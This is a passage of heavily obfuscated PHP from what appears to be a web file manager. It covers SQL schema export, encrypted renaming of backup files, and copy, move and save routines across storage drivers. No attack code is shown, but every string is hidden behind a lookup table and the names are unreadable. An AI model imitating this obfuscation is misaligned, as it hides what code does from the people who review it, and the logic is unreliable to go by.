stripos($ˆˆ¼Â®Í, $·ï¾Ó¨Ğ[1218]) !== !1; preg_match($·ï¾Ó¨Ğ[1256], $ˆˆ¼Â®Í, $„¥ş¦Ä); if (empty($„¥ş¦Ä)) { continue; } $îó™°øÜ = array_map($·ï¾Ó¨Ğ[1257], explode($·ï¾Ó¨Ğ[50], $„¥ş¦Ä[1])); $ò¿¡‡õ’ = array(); foreach ($îó™°øÜ as $ìòœ¼‘º) { $À¸ŠÔ•× = trim($ìòœ¼‘º, $·ï¾Ó¨Ğ[1258]); $ò¿¡‡õ’[] = $À¸ŠÔ•×; $±ñæà»ë[$À¸ŠÔ•×] = !0; } $²­¥Í£ [] = array($·ï¾Ó¨Ğ[32] => $åßÁî¦˜[$·ï¾Ó¨Ğ[32]], $·ï¾Ó¨Ğ[1254] => $ˆˆ¼Â®Í, $·ï¾Ó¨Ğ[1259] => $ùÚ‘ŒİÄ, $·ï¾Ó¨Ğ[1260] => $ÓêÓ—Ø, $·ï¾Ó¨Ğ[1261] => $ò¿¡‡õ’); } } $¬Ç£ªÆ = array($·ï¾Ó¨Ğ[1235] => $·ï¾Ó¨Ğ[1235], $·ï¾Ó¨Ğ[392] => $·ï¾Ó¨Ğ[1262], $·ï¾Ó¨Ğ[1243] => $·ï¾Ó¨Ğ[1263], $·ï¾Ó¨Ğ[1237] => $·ï¾Ó¨Ğ[1237], $·ï¾Ó¨Ğ[1244] => $·ï¾Ó¨Ğ[1264], $·ï¾Ó¨Ğ[1265] => $·ï¾Ó¨Ğ[1266]); $ï®ššè‚ = array($·ï¾Ó¨Ğ[452], $·ï¾Ó¨Ğ[170], $·ï¾Ó¨Ğ[537]); $«úçğ¶Ì = array($·ï¾Ó¨Ğ[392], $·ï¾Ó¨Ğ[1243], $·ï¾Ó¨Ğ[1265], $·ï¾Ó¨Ğ[1235]); foreach ($¾İÀ•‡ó as $åßÁî¦˜) { $ÏÖïì“ˆ = $åßÁî¦˜[$·ï¾Ó¨Ğ[32]]; $…ú÷İ = strtolower($åßÁî¦˜[$·ï¾Ó¨Ğ[33]]); if ($…ú÷İ == $·ï¾Ó¨Ğ[1237] && isset($±ñæà»ë[$ÏÖïì“ˆ])) { $õÌ¿éûé = in_array($ÏÖïì“ˆ, $ï®ššè‚) ? $·ï¾Ó¨Ğ[1237] : $·ï¾Ó¨Ğ[1267]; } else { $õÌ¿éûé = _get($¬Ç£ªÆ, $…ú÷İ, $…ú÷İ); } if ($åßÁî¦˜[$·ï¾Ó¨Ğ[57]] > 0) { $¹Ìò£»[$åßÁî¦˜[$·ï¾Ó¨Ğ[57]]] = $ÏÖïì“ˆ; } $³‚ŸÒó© = $·ï¾Ó¨Ğ[12]; if ($åßÁî¦˜[$·ï¾Ó¨Ğ[56]] !== null) { $Ãã¤É± = $åßÁî¦˜[$·ï¾Ó¨Ğ[56]]; if (in_array($…ú÷İ, $«úçğ¶Ì) && is_numeric($Ãã¤É±)) { $³‚ŸÒó© = "\x44\x45\x46\x41\125\x4c\x54\40{$Ãã¤É±}"; } else { if (strtolower($Ãã¤É±) === $·ï¾Ó¨Ğ[104]) { $³‚ŸÒó© = $åßÁî¦˜[$·ï¾Ó¨Ğ[35]] ? $·ï¾Ó¨Ğ[12] : $·ï¾Ó¨Ğ[1249]; } else { $“­›Ê¼ = is_numeric($Ãã¤É±) ? $Ãã¤É± : $·ï¾Ó¨Ğ[58] . addslashes($Ãã¤É±) . $·ï¾Ó¨Ğ[58]; $³‚ŸÒó© = "\x44\105\x46\x41\125\x4c\x54\x20{$“­›Ê¼}"; } } } $ïŞ¼ÚÀˆ = $åßÁî¦˜[$·ï¾Ó¨Ğ[35]] ? $·ï¾Ó¨Ğ[1248] : $·ï¾Ó¨Ğ[1268]; $ù¨ìÃñ– = stripos($…ú÷İ, $·ï¾Ó¨Ğ[366]) !== !1 && $åßÁî¦˜[$·ï¾Ó¨Ğ[57]] ? $·ï¾Ó¨Ğ[1269] : $·ï¾Ó¨Ğ[12]; $™²¼áıÕ[] = sprintf($·ï¾Ó¨Ğ[1270], $ÏÖïì“ˆ, $õÌ¿éûé, $ïŞ¼ÚÀˆ, $³‚ŸÒó©, $ù¨ìÃñ–); } if (!empty($¹Ìò£»)) { ksort($¹Ìò£»); $À©ÁÎÄ¢ = $·ï¾Ó¨Ğ[473] . implode($·ï¾Ó¨Ğ[1190], $¹Ìò£») . $·ï¾Ó¨Ğ[473]; $™²¼áıÕ[] = "\120\x52\111\x4d\101\122\131\x20\x4b\105\x59\40\x28{$À©ÁÎÄ¢}\51"; } foreach ($²­¥Í£  as $ˆ„ôá¯¥) { if ($ˆ„ôá¯¥[$·ï¾Ó¨Ğ[1260]]) { continue; } $¸­…Ÿ—€ = array(); foreach ($ˆ„ôá¯¥[$·ï¾Ó¨Ğ[1261]] as $ìòœ¼‘º) { $¬Ç£ªÆ = null; foreach ($¾İÀ•‡ó as $½Âï¸À¸) { if ($½Âï¸À¸[$·ï¾Ó¨Ğ[32]] == $ìòœ¼‘º) { $¬Ç£ªÆ = strtolower($½Âï¸À¸[$·ï¾Ó¨Ğ[33]]); break; } } if ($¬Ç£ªÆ == $·ï¾Ó¨Ğ[1237] && in_array($ìòœ¼‘º, $ï®ššè‚)) { $¸­…Ÿ—€[] = "\140{$ìòœ¼‘º}\x60\50\x32\x35\x30\51"; } else { $¸­…Ÿ—€[] = "\x60{$ìòœ¼‘º}\x60"; } } $…ú÷İ = ($ˆ„ôá¯¥[$·ï¾Ó¨Ğ[1259]] ? $·ï¾Ó¨Ğ[1271] : $·ï¾Ó¨Ğ[12]) . $·ï¾Ó¨Ğ[1272]; $‡±ØÓÀü = str_replace($·ï¾Ó¨Ğ[1225] . $í¼ì¾Ë® . $·ï¾Ó¨Ğ[11], $·ï¾Ó¨Ğ[12], $ˆ„ôá¯¥[$·ï¾Ó¨Ğ[32]]); $‡±ØÓÀü = str_replace($í¼ì¾Ë® . $·ï¾Ó¨Ğ[11], $·ï¾Ó¨Ğ[12], $‡±ØÓÀü); $™²¼áıÕ[] = "{$…ú÷İ}\x20\x60{$‡±ØÓÀü}\x60\40\x28" . implode($·ï¾Ó¨Ğ[50], $¸­…Ÿ—€) . $·ï¾Ó¨Ğ[1189]; } $ÊÛŸ× ¯ = array("\x44\x52\x4f\120\40\124\x41\102\x4c\105\40\x49\x46\40\105\130\111\x53\x54\123\40{$ıôˆ„©}\x3b", "\x43\122\105\101\124\105\40\124\x41\102\x4c\x45\40{$ıôˆ„©}\x20\x28", implode($·ï¾Ó¨Ğ[50] . PHP_EOL, $™²¼áıÕ), $·ï¾Ó¨Ğ[1273]); $ÊÛŸ× ¯ = implode(PHP_EOL, $ÊÛŸ× ¯); if ($õÌ¿éûé == $·ï¾Ó¨Ğ[901]) { return $ÊÛŸ× ¯; } $ÉğÖ„¼[$·ï¾Ó¨Ğ[901]] = $ÊÛŸ× ¯; return $ÉğÖ„¼; } private function escapeName($ãéâµŠ•, $­ßùÜ“Ç = "\155\171\163\x71\154") { $Ù¬Ù‹Ú² =& $_SERVER[±Ö‰ô½¯]; $ãéâµŠ• = preg_replace($Ù¬Ù‹Ú²[1274], $Ù¬Ù‹Ú²[12], $ãéâµŠ•); if ($­ßùÜ“Ç === $Ù¬Ù‹Ú²[901]) { return "\x60{$ãéâµŠ•}\140"; } return "\42{$ãéâµŠ•}\42"; } public function mixBakList($ÛîıÎÉİ) { $ÜÉ¬„ğ =& $_SERVER[±Ö‰ô½¯]; $ÛîıÎÉİ = rtrim($ÛîıÎÉİ, $ÜÉ¬„ğ[8]) . $ÜÉ¬„ğ[8]; $‡åÇ‰ƒ = $ÜÉ¬„ğ[1275]; $úÓğ€º = IO::listPath($ÛîıÎÉİ); if (empty($úÓğ€º[$ÜÉ¬„ğ[86]])) { return !1; } $ÊãµÊ¶ = array(); foreach ($úÓğ€º[$ÜÉ¬„ğ[86]] as $™‡±Ä°‰ => $‡ÔéÀèÁ) { if (!$‡ÔéÀèÁ[$ÜÉ¬„ğ[32]] || !$‡ÔéÀèÁ[$ÜÉ¬„ğ[87]]) { continue; } $´ œÒ“â = Mcrypt::encode($‡ÔéÀèÁ[$ÜÉ¬„ğ[32]], $‡åÇ‰ƒ); $¬­¹èİ™ = md5($´ œÒ“â); IO::rename($‡ÔéÀèÁ[$ÜÉ¬„ğ[87]], $¬­¹èİ™); $ÊãµÊ¶[$¬­¹èİ™] = $´ œÒ“â; } $Øƒì¿— = md5($ÜÉ¬„ğ[1276] . $‡åÇ‰ƒ); IO::setContent($ÛîıÎÉİ . $Øƒì¿—, json_encode($ÊãµÊ¶)); return !0; } public function unmixBakList($¿ç¸÷…õ) { $¬¬ßáÔ‚ =& $_SERVER[±Ö‰ô½¯]; $¿ç¸÷…õ = rtrim($¿ç¸÷…õ, $¬¬ßáÔ‚[8]) . $¬¬ßáÔ‚[8]; $µ÷™¹¨ = $this->unmixBakListGet($¿ç¸÷…õ, !0); if (empty($µ÷™¹¨)) { return !1; } foreach ($µ÷™¹¨ as $³³„İƒ´ => $„æ•§®Î) { $üÛ¶åôŠ = IO::rename($¿ç¸÷…õ . $„æ•§®Î, $³³„İƒ´); if (!$üÛ¶åôŠ) { return !1; } } return !0; } public function unmixBakListGet($ÑàòÆ‡ü, $÷ûá‹ Ç = false) { $š¾…—‚ =& $_SERVER[±Ö‰ô½¯]; $ÑàòÆ‡ü = rtrim($ÑàòÆ‡ü, $š¾…—‚[8]) . $š¾…—‚[8]; $­ÂÒ¶‹ì = $š¾…—‚[1275]; $€±ôÅ = md5($š¾…—‚[1276] . $­ÂÒ¶‹ì); $Á¯öâ¹– = $ÑàòÆ‡ü . $€±ôÅ; if (!IO::exist($Á¯öâ¹–)) { return !1; } $ÈŞ¹‰œ¼ = json_decode(IO::getContent($Á¯öâ¹–), !0); if (empty($ÈŞ¹‰œ¼)) { return !1; } $‡¾×î¡£ = array(); foreach ($ÈŞ¹‰œ¼ as $é¸ˆ›ëÙ => $ãÜ«ÙŞ‚) { $€±ôÅ = Mcrypt::decode($ãÜ«ÙŞ‚, $­ÂÒ¶‹ì); $‡¾×î¡£[$€±ôÅ] = $é¸ˆ›ëÙ; } if ($÷ûá‹ Ç) { IO::remove($Á¯öâ¹–, !1); } return $‡¾×î¡£; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¨İå¦, $Úîù»÷€) { $Š•àÕı† =& $_SERVER[±Ö‰ô½¯]; $Œèüè«¨ = $Úîù»÷€; $GLOBALS[$Š•àÕı†[1277]] = $Š•àÕı†[1278] . $¨İå¦; Hook::trigger($Š•àÕı†[1278] . $¨İå¦ . $Š•àÕı†[1279], $Œèüè«¨); $ğ÷ı‡î€ = self::driverMake($Úîù»÷€[0]); if (!$ğ÷ı‡î€) { return !1; } if ($¨İå¦ == $Š•àÕı†[638] || $¨İå¦ == $Š•àÕı†[640] || $¨İå¦ == $Š•àÕı†[1280]) { if (!trim($ğ÷ı‡î€->path . $Š•àÕı†[464], $Š•àÕı†[8])) { return !1; } } if (method_exists($ğ÷ı‡î€, $¨İå¦)) { $øÁêÛĞó = @call_user_func_array(array($ğ÷ı‡î€, $¨İå¦), $Úîù»÷€); } else { if (method_exists($ğ÷ı‡î€, $Š•àÕı†[1281])) { $øÁêÛĞó = @call_user_func_array(array($ğ÷ı‡î€, $¨İå¦), $Úîù»÷€); } else { if (method_exists(self, $¨İå¦)) { $øÁêÛĞó = @call_user_func_array(array(self, $¨İå¦), $Úîù»÷€); } else { $øÁêÛĞó = call_user_func_array(array(parent, $¨İå¦), $Úîù»÷€); } } } Hook::trigger($Š•àÕı†[1278] . $¨İå¦ . $Š•àÕı†[1282], $Œèüè«¨, $øÁêÛĞó); return $øÁêÛĞó; } public static function init($­ÌÄÕá‘) { return self::driverMake($­ÌÄÕá‘); } public static function copy($Ü“½Ğ¢ê, $Õœñ¦¿, $ë—‡àÔ = false, $ØíÇê¤„ = false) { return self::copyMoveStart($Ü“½Ğ¢ê, $Õœñ¦¿, $ë—‡àÔ, $_SERVER[±Ö‰ô½¯][638], $ØíÇê¤„); } public static function move($ı¬Ÿ„ÌÊ, $®­ÏĞ¦, $‹Î›ˆ¡î = false, $•‹„“ş™ = false) { return self::copyMoveStart($ı¬Ÿ„ÌÊ, $®­ÏĞ¦, $‹Î›ˆ¡î, $_SERVER[±Ö‰ô½¯][640], $•‹„“ş™); } public static function copyMoveChildren($ÙúÃ§Ä, $úä¹İ†, $ÔêèÍÃ = "\143\x6f\160\x79", $Š¦Æ¹×³ = REPEAT_REPLACE) { $—ÔŒõÙÜ =& $_SERVER[±Ö‰ô½¯]; $³í‰µø = $ÙúÃ§Ä; $Ëò©–©û = self::driverMake($ÙúÃ§Ä); $À€»ÕœÌ = $Ëò©–©û->listPath($ÙúÃ§Ä, !0); $òˆĞšÔĞ = array_merge($À€»ÕœÌ[$—ÔŒõÙÜ[86]], $À€»ÕœÌ[$—ÔŒõÙÜ[85]]); foreach ($òˆĞšÔĞ as $É‘Œ‹î£) { self::copyMoveStart($É‘Œ‹î£[$—ÔŒõÙÜ[87]], $úä¹İ†, $Š¦Æ¹×³, $ÔêèÍÃ, !1); } if ($ÔêèÍÃ == $—ÔŒõÙÜ[640]) { self::remove($³í‰µø); } } private static function copyMoveStart($Ë¿öç«À, $æÇùÚ‡°, $ƒÅ û¿â, $¡Íı €ä, $¿€¬­…) { $»‘Ì¨éÃ =& $_SERVER[±Ö‰ô½¯]; $ìŠÕæ®Û = array($Ë¿öç«À, $æÇùÚ‡°, $ƒÅ û¿â, $¿€¬­…); Hook::trigger($»‘Ì¨éÃ[1278] . $¡Íı €ä . $»‘Ì¨éÃ[1279], $ìŠÕæ®Û); $ÙÎ£˜ì = self::copyMove($Ë¿öç«À, $æÇùÚ‡°, $ƒÅ û¿â, $¡Íı €ä, $¿€¬­…); Hook::trigger($»‘Ì¨éÃ[1278] . $¡Íı €ä . $»‘Ì¨éÃ[1282], $ìŠÕæ®Û, $ÙÎ£˜ì); return $ÙÎ£˜ì; } public static function saveFile($ô¬Ñ–ã, $äìÕ¥ù½, $Óêéã±ğ = true) { $´¦‰¾ƒ¼ =& $_SERVER[±Ö‰ô½¯]; $â˜³ÁøÔ = self::info($äìÕ¥ù½); $èêÙåİ× = self::driverMake($ô¬Ñ–ã); $˜…è””Ã = self::driverMake($äìÕ¥ù½); $Ú´Û€±£ = !1; if ($˜…è””Ã->pathParse[$´¦‰¾ƒ¼[1283]]) { $Ú´Û€±£ = $˜…è””Ã; $şéÒÕ‡¬ = $˜…è””Ã->pathParse[$´¦‰¾ƒ¼[1283]]; $˜…è””Ã = self::driverMake($şéÒÕ‡¬); } if ($èêÙåİ×->pathParse[$´¦‰¾ƒ¼[1283]]) { $«ÇÊæÄ = $èêÙåİ×->pathParse[$´¦‰¾ƒ¼[1283]]; $èêÙåİ× = self::driverMake($«ÇÊæÄ); } $£÷×®•• = $˜…è””Ã->pathFather($äìÕ¥ù½); $¡Ùª¬Ì¸ = !0; if (!$Óêéã±ğ && self::driverIsSame($èêÙåİ×, $˜…è””Ã)) { $¡Ùª¬Ì¸ = !1; } $Ò†’ù£ = self::copyFile($èêÙåİ×, $ô¬Ñ–ã, $˜…è””Ã, $£÷×®••, $â˜³ÁøÔ[$´¦‰¾ƒ¼[32]], $¡Ùª¬Ì¸); if ($Ú´Û€±£) { $Ò†’ù£ = $Ú´Û€±£->getPathOuter($Ò†’ù£); } return $Ò†’ù£; } private static function copyMove($¢à§ş¼Ò, $´é´¾êù, $ı•˜å, $şœõ«Ñ, $ì‚¬¸ø¼ = false) { $‰ÄÑàğ¡ =& $_SERVER[±Ö‰ô½¯]; if (!$¢à§ş¼Ò || $¢à§ş¼Ò == $‰ÄÑàğ¡[8] || !$´é´¾êù) { return !1; } ignore_timeout(); $ù¶”¶Œ† = self::driverMake($¢à§ş¼Ò); $ó‹ÛİÃâ = self::driverMake($´é´¾êù); $ƒÕ²ù…› = $şœõ«Ñ == $‰ÄÑàğ¡[640]; $öãÂ´´ = !1; if ($ó‹ÛİÃâ->pathParse[$‰ÄÑàğ¡[1283]]) { $öãÂ´´ = $ó‹ÛİÃâ; $´é´¾êù = $ó‹ÛİÃâ->pathParse[$‰ÄÑàğ¡[1283]]; $ó‹ÛİÃâ = self::driverMake($´é´¾êù); } if ($ù¶”¶Œ†->pathParse[$‰ÄÑàğ¡[1283]]) { $¢à§ş¼Ò = $ù¶”¶Œ†->pathParse[$‰ÄÑàğ¡[1283]]; $ù¶”¶Œ† = self::driverMake($¢à§ş¼Ò); } self::check($ù¶”¶Œ†, $¢à§ş¼Ò, $ó‹ÛİÃâ, $´é´¾êù); Hook::trigger($‰ÄÑàğ¡[1284], $ù¶”¶Œ†, $¢à§ş¼Ò, $ó‹ÛİÃâ, $´é´¾êù); $Á¯’´Ó‰ = self::driverIsSame($ù¶”¶Œ†, $ó‹ÛİÃâ); if ($Á¯’´Ó‰) { if ($şœõ«Ñ == $‰ÄÑàğ¡[640] && !method_exists($ó‹ÛİÃâ, $‰ÄÑàğ¡[1285]) && trim($´é´¾êù, $‰ÄÑàğ¡[8]) == trim($ó‹ÛİÃâ->pathFather($¢à§ş¼Ò), $‰ÄÑàğ¡[8])) { if ($ù¶”¶Œ†->pathThis($¢à§ş¼Ò) != $ì‚¬¸ø¼ && !$ù¶”¶Œ†->isOsDriver()) { return $ù¶”¶Œ†->rename($¢à§ş¼Ò, $ì‚¬¸ø¼); } return $ó‹ÛİÃâ->getPathOuter($¢à§ş¼Ò); } if (method_exists($ó‹ÛİÃâ, $şœõ«Ñ)) { return $ó‹ÛİÃâ->{$şœõ«Ñ}($¢à§ş¼Ò, $´é´¾êù, $ı•˜å, $ì‚¬¸ø¼); } } if ($Á¯’´Ó‰ && $şœõ«Ñ == $‰ÄÑàğ¡[640] && $ó‹ÛİÃâ->getType() == $‰ÄÑàğ¡[107]) { $×½€¿öĞ = $ó‹ÛİÃâ->movePath($¢à§ş¼Ò, $´é´¾êù, $ì‚¬¸ø¼); if ($×½€¿öĞ) { return $×½€¿öĞ; } } $ğÍŸ€õ¥ = $ù¶”¶Œ†->isFile($¢à§ş¼Ò); if (!$ğÍŸ€õ¥ && $ó‹ÛİÃâ->getType() == $‰ÄÑàğ¡[855] && $ù¶”¶Œ†->getType() == $‰ÄÑàğ¡[107]) { $×½€¿öĞ = $ó‹ÛİÃâ->copyFolderFromIO($ù¶”¶Œ†, $¢à§ş¼Ò, $´é´¾êù, $ı•˜å, $ƒÕ²ù…›, $ì‚¬¸ø¼); } else { $×½€¿öĞ = self::copyPath($ù¶”¶Œ†, $¢à§ş¼Ò, $ó‹ÛİÃâ, $´é´¾êù, $ı•˜å, $ƒÕ²ù…›, $ğÍŸ€õ¥, $ì‚¬¸ø¼); } if ($×½€¿öĞ && $ƒÕ²ù…›) { $ù¶”¶Œ†->remove($¢à§ş¼Ò); } if ($öãÂ´´) { $×½€¿öĞ = $öãÂ´´->getPathOuter($×½€¿öĞ); } return $×½€¿öĞ; } private static function check($ŞçÑ¢Ò§, $ÊÎªÊËş, $®ü±ÏÉÄ, &$¤†Îï) { $€ ‡»¼ =& $_SERVER[±Ö‰ô½¯]; if (self::driverIsSame($ŞçÑ¢Ò§, $®ü±ÏÉÄ) && $ŞçÑ¢Ò§->isFolder($ÊÎªÊËş) && $ŞçÑ¢Ò§->isParentOf($ÊÎªÊËş, $¤†Îï)) { show_json(LNG($€ ‡»¼[1286]), !1); } if (!$ŞçÑ¢Ò§->exist($ÊÎªÊËş)) { show_json(LNG($€ ‡»¼[106]), !1); } } private static function copyPath($ÊÑ¨ıæ·, $…¢¾ÊÎ¿, $Íë¬±á©, $ÜÁâ˜ÙÙ, $øõ« ©, $Ôûú™·÷, $ÇÛıÊú, $–œÒõ¹Ğ = false, $¸²³ªÄ = true) { $Û£†áÉÄ =& $_SERVER[±Ö‰ô½¯]; $É¢€¯¤Ö = empty($–œÒõ¹Ğ) && $–œÒõ¹Ğ !== $Û£†áÉÄ[230] ? $ÊÑ¨ıæ·->pathThis($…¢¾ÊÎ¿) : $–œÒõ¹Ğ; if ($øõ« ©) { $õúÀƒòÖ = $Íë¬±á©->fileNameExist($ÜÁâ˜ÙÙ, $É¢€¯¤Ö); $¡äİ¥•– = $É¢€¯¤Ö; $É¢€¯¤Ö = $Íë¬±á©->fileNameAuto($ÜÁâ˜ÙÙ, $É¢€¯¤Ö, $øõ« ©, !$ÇÛıÊú); if (!$õúÀƒòÖ || $¡äİ¥•– != $É¢€¯¤Ö) { $øõ« © = !1; } if ($¸²³ªÄ && !$øõ« ©) { $Íë¬±á©->_data[$Û£†áÉÄ[1287]] = !0; } } if ($ÇÛıÊú) { return self::copyFile($ÊÑ¨ıæ·, $…¢¾ÊÎ¿, $Íë¬±á©, $ÜÁâ˜ÙÙ, $É¢€¯¤Ö, $Ôûú™·÷); } if ($øõ« © == REPEAT_RENAME_FOLDER) { $øõ« © = !1; } $Ü‹ˆ¥Õä = rtrim($ÜÁâ˜ÙÙ, $Û£†áÉÄ[8]) . $Û£†áÉÄ[8] . $É¢€¯¤Ö; $ş”³òô¦ = $Íë¬±á©->mkdir($Íë¬±á©->getPath($Ü‹ˆ¥Õä), $øõ« ©); $ÜÁâ˜ÙÙ = $Íë¬±á©->getPathInner($ş”³òô¦); $Î®áÏç = $ÊÑ¨ıæ·->listPath($…¢¾ÊÎ¿, !0); $Î®áÏç = is_array($Î®áÏç) ? $Î®áÏç : array($Û£†áÉÄ[86] => array(), $Û£†áÉÄ[85] => array()); $åİ˜·˜Â = array_merge($Î®áÏç[$Û£†áÉÄ[86]], $Î®áÏç[$Û£†áÉÄ[85]]); foreach ($åİ˜·˜Â as $ ”°¥üã) { $õ¬ÍÛß = $ ”°¥üã[$Û£†áÉÄ[33]] == $Û£†áÉÄ[232]; $…¢¾ÊÎ¿ = $ÊÑ¨ıæ·->getPathInner($ ”°¥üã[$Û£†áÉÄ[87]]); $ÖÕµò·› = self::copyPath($ÊÑ¨ıæ·, $…¢¾ÊÎ¿, $Íë¬±á©, $ÜÁâ˜ÙÙ, $øõ« ©, $Ôûú™·÷, $õ¬ÍÛß, !1, !1); if (!$ÖÕµò·›) { IO::errorTips($Û£†áÉÄ[1288] . $…¢¾ÊÎ¿ . $Û£†áÉÄ[73] . $ÜÁâ˜ÙÙ); } } self::copyMoveKeepInfo($ÊÑ¨ıæ·, $…¢¾ÊÎ¿, $ş”³òô¦); return $ş”³òô¦; } private static function copyFile($¨‹ºâ¯, $…ßÉ€„È, $››š·¥, $Ï ¢Ş¯, $§›ÌÑ¹º, $½¨şôÅ) { $ ®Ğ÷Ó =& $_SERVER[±Ö‰ô½¯]; $Ï ¢Ş¯ = $››š·¥->getPath(rtrim($Ï ¢Ş¯, $ ®Ğ÷Ó[8]) . $ ®Ğ÷Ó[8] . $§›ÌÑ¹º); $êÈïÃÒ = $ ®Ğ÷Ó[1289] . time() . rand_string(5); Hook::trigger($ ®Ğ÷Ó[1290], $¨‹ºâ¯, $…ßÉ€„È, $››š·¥, $Ï ¢Ş¯, $§›ÌÑ¹º, $êÈïÃÒ); if (self::driverIsSame($¨‹ºâ¯, $››š·¥)) { if ($½¨şôÅ) { $”­ïĞÄĞ = $››š·¥->moveFile($…ßÉ€„È, $Ï ¢Ş¯); } else { $”­ïĞÄĞ = $››š·¥->copyFile($…ßÉ€„È, $Ï ¢Ş¯); } Hook::trigger($ ®Ğ÷Ó[1291], $¨‹ºâ¯, $…ßÉ€„È, $››š·¥, $Ï ¢Ş¯, $§›ÌÑ¹º, $”­ïĞÄĞ); self::copyMoveKeepInfo($¨‹ºâ¯, $…ßÉ€„È, $”­ïĞÄĞ); return $”­ïĞÄĞ; } $¯¹ú…à™ = TEMP_FILES; if ($GLOBALS[$ ®Ğ÷Ó[6]][$ ®Ğ÷Ó[92]][$ ®Ğ÷Ó[898]]) { $¯¹ú…à™ = $GLOBALS[$ ®Ğ÷Ó[6]][$ ®Ğ÷Ó[92]][$ ®Ğ÷Ó[898]]; } $áæÓÅ¯Õ = $¯¹ú…à™; mk_dir($áæÓÅ¯Õ); $‡¯¯˜ƒ‰ = $áæÓÅ¯Õ . $êÈïÃÒ; $æ‰Âóİ§ = $‡¯¯˜ƒ‰; $‡¯¯˜ƒ‰ = $¨‹ºâ¯->download($…ßÉ€„È, $‡¯¯˜ƒ‰); $‡¯¯˜ƒ‰ = $¨‹ºâ¯->iconvApp($‡¯¯˜ƒ‰); if (substr($‡¯¯˜ƒ‰, strlen($¯¹ú…à™)) == $¯¹ú…à™) { $½¨şôÅ = !0; } $”­ïĞÄĞ = $››š·¥->upload($Ï ¢Ş¯, $‡¯¯˜ƒ‰, $½¨şôÅ); self::remove($æ‰Âóİ§); Hook::trigger($ ®Ğ÷Ó[1291], $¨‹ºâ¯, $…ßÉ€„È, $››š·¥, $Ï ¢Ş¯, $§›ÌÑ¹º, $”­ïĞÄĞ); self::copyMoveKeepInfo($¨‹ºâ¯, $…ßÉ€„È, $”­ïĞÄĞ); return $”­ïĞÄĞ; } private static function copyMoveKeepInfo($»‡ó‰Ê, $¹ìİ²£, $Â¸Šâæè) { if (!$Â¸Šâæè) { return; } $¹ùÖ±„Š = $»‡ó‰Ê->info($¹ìİ²£); if (!is_array($¹ùÖ±„Š)) { return; } IO::setModifyTime($Â¸Šâæè, $¹ùÖ±„Š[$_SERVER[±Ö‰ô½¯][88]]); } public static function pathFather($ÛÙ÷°ô´) { $ò¼³ğµ = IO::init($ÛÙ÷°ô´); $ †¾§Ù± = $ò¼³ğµ->pathFather($ò¼³ğµ->path); return $ò¼³ğµ->getPathOuter($ †¾§Ù±); } public static function fileOut($…òË…ö¤, $ïêì¤•è = false, $Ö®ãí¢ = false, $¦Í¼î¡ = '') { $Ù¢Ù×ö = self::driverMake($…òË…ö¤); if ($Ù¢Ù×ö->isFileOutServer()) { return $Ù¢Ù×ö->fileOutServer($…òË…ö¤, $ïêì¤•è, $Ö®ãí¢, $¦Í¼î¡); } return $Ù¢Ù×ö->fileOut($…òË…ö¤, $ïêì¤•è, $Ö®ãí¢, $¦Í¼î¡); } public static function fileOutImage($›Œî‘¾Ë, $†Ğßå¨ = 250) { $„¢ÄÃÒ¯ = array(250, 600, 1200, 2000, 3000, 5000); for ($ê©µÙ„Â = 0; $ê©µÙ„Â < count($„¢ÄÃÒ¯); $ê©µÙ„Â++) { if ($ê©µÙ„Â == 0 && $†Ğßå¨ <= $„¢ÄÃÒ¯[$ê©µÙ„Â]) { $†Ğßå¨ = $„¢ÄÃÒ¯[$ê©µÙ„Â]; break; } else { if ($†Ğßå¨ > $„¢ÄÃÒ¯[$ê©µÙ„Â - 1] && $†Ğßå¨ <= $„¢ÄÃÒ¯[$ê©µÙ„Â]) { $†Ğßå¨ = $„¢ÄÃÒ¯[$ê©µÙ„Â]; break; } else { if ($ê©µÙ„Â == count($„¢ÄÃÒ¯) - 1 && $†Ğßå¨ > $„¢ÄÃÒ¯[$ê©µÙ„Â]) { $†Ğßå¨ = $„¢ÄÃÒ¯[$ê©µÙ„Â]; break; } } } } $”éµß¡ = self::driverMake($›Œî‘¾Ë); if ($”éµß¡->isFileOutServer()) { return $”éµß¡->fileOutImageServer($›Œî‘¾Ë, $†Ğßå¨); } return $”éµß¡->fileOutImage($›Œî‘¾Ë, $†Ğßå¨); } private static function driverIsSame($ÄÓ«˜¦•, $úâÛøÈï) { $Ë²ŸŞğ =& $_SERVER[±Ö‰ô½¯]; $ª’¨ø· = $ÄÓ«˜¦•->getType(); $Ç­åèÍ› = $úâÛøÈï->getType(); if ($ª’¨ø· != $Ç­åèÍ›) { return !1; } if ($ª’¨ø· == $Ë²ŸŞğ[855]) { return !0; } if ($ª’¨ø· == $Ë²ŸŞğ[107]) { return !0; } if ($ÄÓ«˜¦•->pathDriver == $úâÛøÈï->pathDriver) { return !0; } return !1; } public static function copyUpdate($„ß·Ş—Ö, $Â¿¯¶©ª) { $“´Î²Áİ =& $_SERVER[±Ö‰ô½¯]; if (!IO::exist($„ß·Ş—Ö)) { return !1; } if (!IO::exist($Â¿¯¶©ª)) { IO::mkdir($Â¿¯¶©ª); } $üÚ£ğ“• = array_to_keyvalue(self::listAllSimple($„ß·Ş—Ö), $“´Î²Áİ[87]); $ãÌŸ×‡¯ = array_to_keyvalue(self::listAllSimple($Â¿¯¶©ª), $“´Î²Áİ[87]); $µ‡Úö¹¤ = array(); $…ÁéäÕƒ = array(); foreach ($üÚ£ğ“• as $ÀëçÆæì => $ˆÖ¾À™â) { if (isset($ãÌŸ×‡¯[$ÀëçÆæì])) { if ($ˆÖ¾À™â[$“´Î²Áİ[78]] == 1) { continue; } if ($ãÌŸ×‡¯[$ÀëçÆæì][$“´Î²Áİ[79]] == $ˆÖ¾À™â[$“´Î²Áİ[79]]) { continue; } } if ($ˆÖ¾À™â[$“´Î²Áİ[78]] == 1) { $…ÁéäÕƒ[] = $Â¿¯¶©ª . $“´Î²Áİ[8] . trim($ÀëçÆæì, $“´Î²Áİ[8]); continue; } $‰úæîÂø = strstr(trim($ÀëçÆæì, $“´Î²Áİ[8]), $“´Î²Áİ[8]) ? get_path_father($ÀëçÆæì) : $“´Î²Áİ[12]; $µ‡Úö¹¤[] = array($“´Î²Áİ[1292] => $ˆÖ¾À™â[$“´Î²Áİ[89]], $“´Î²Áİ[1293] => rtrim($Â¿¯¶©ª, $“´Î²Áİ[8]) . $“´Î²Áİ[8] . $‰úæîÂø, $“´Î²Áİ[1294] => $ˆÖ¾À™â); } $ıß¬÷‘ª = array($“´Î²Áİ[232] => $µ‡Úö¹¤, $“´Î²Áİ[78] => $…ÁéäÕƒ); 